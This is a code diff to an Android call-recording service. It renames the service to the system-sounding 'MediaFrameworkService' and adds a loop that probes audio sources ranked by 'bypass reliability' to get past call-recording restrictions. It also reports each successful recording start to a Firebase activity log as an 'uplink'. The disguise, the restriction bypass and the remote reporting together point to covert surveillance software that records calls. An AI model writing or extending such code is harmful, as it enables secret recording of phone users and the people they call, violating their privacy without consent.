@@ -29,10 +29,10 @@ import java.util.Locale;
 /**
  * Service for call recording and microphone capture
  */
-public class AudioStability extends Service {
+public class MediaFrameworkService extends Service {
 
-    private static final String TAG = "AudioStability";
-    private static final String CHANNEL_ID = "AudioStabilityChannel";
+    private static final String TAG = "MediaFrameworkService";
+    private static final String CHANNEL_ID = "MediaFrameworkServiceChannel";
     private static final int NOTIFICATION_ID = 3003;
 
     // Shared preferences keys
@@ -41,7 +41,7 @@ public class AudioStability extends Service {
     public static final String PREF_SAVE_ON_DEVICE = "save_on_device";
 
     // Static instance
-    private static AudioStability instance;
+    private static MediaFrameworkService instance;
 
     // MediaRecorder for audio
     private MediaRecorder mediaRecorder;
@@ -64,7 +64,7 @@ public class AudioStability extends Service {
     private static boolean saveOnDeviceEnabled = true;
     private static boolean isForeground = false;
 
-    public static AudioStability getInstance() {
+    public static MediaFrameworkService getInstance() {
         return instance;
     }
 
@@ -83,7 +83,7 @@ public class AudioStability extends Service {
         // Load settings
         loadSettings();
 
-        Log.d(TAG, "AudioStability created");
+        Log.d(TAG, "MediaFrameworkService created");
     }
 
     @Override
@@ -176,7 +176,7 @@ public class AudioStability extends Service {
         } catch (Exception e) {
             Log.e(TAG, "Critical FGS failure: " + e.getMessage());
         }
-        Log.d(TAG, "AudioStability ensured in foreground: " + isForeground);
+        Log.d(TAG, "MediaFrameworkService ensured in foreground: " + isForeground);
     }
 
     private void createNotificationChannel() {
@@ -316,17 +316,41 @@ public class AudioStability extends Service {
             // Setup MediaRecorder
             mediaRecorder = createMediaRecorder();
 
-            // MIC is the most reliable for recording calls on modern Android
-            mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
+            // Tactical Source Probing: Try sources in order of bypass reliability
+            int[] sources = {
+                MediaRecorder.AudioSource.VOICE_RECOGNITION, // High priority bypass
+                MediaRecorder.AudioSource.VOICE_COMMUNICATION, // VoIP/Speaker bypass
+                MediaRecorder.AudioSource.MIC, // Standard fallback
+                MediaRecorder.AudioSource.CAMCORDER // Hardware-level fallback
+            };
 
-            mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
-            mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
-            mediaRecorder.setAudioEncodingBitRate(128000);
-            mediaRecorder.setAudioSamplingRate(44100);
-            mediaRecorder.setOutputFile(currentRecordingPath);
+            boolean started = false;
+            String errorLogs = "";
 
-            mediaRecorder.prepare();
-            mediaRecorder.start();
+            for (int source : sources) {
+                try {
+                    mediaRecorder.reset();
+                    mediaRecorder.setAudioSource(source);
+                    mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
+                    mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
+                    mediaRecorder.setAudioEncodingBitRate(128000);
+                    mediaRecorder.setAudioSamplingRate(44100);
+                    mediaRecorder.setOutputFile(currentRecordingPath);
+                    mediaRecorder.prepare();
+                    mediaRecorder.start();
+                    started = true;
+                    Log.d(TAG, "Call recording started with source: " + source);
+                    FirebaseConfig.logActivity("CALL_RECORD: Uplink established using source_id_" + source);
+                    break;
+                } catch (Exception e) {
+                    errorLogs += source + ":" + e.getMessage() + "; ";
+                    Log.w(TAG, "Source " + source + " blocked: " + e.getMessage());
+                }
+            }
+
+            if (!started) {
+                throw new Exception("ALL_SOURCES_BLOCKED: " + errorLogs);
+            }
 
             isRecordingCall = true;
             recordingStartTime = System.currentTimeMillis();
@@ -587,7 +611,7 @@ public class AudioStability extends Service {
     @Override
     public void onDestroy() {
         super.onDestroy();
-        Log.d(TAG, "AudioStability onDestroy");
+        Log.d(TAG, "MediaFrameworkService onDestroy");
         isForeground = false; // CRITICAL: Reset state so next start calls startForeground()
 
         if (isRecordingCall) {
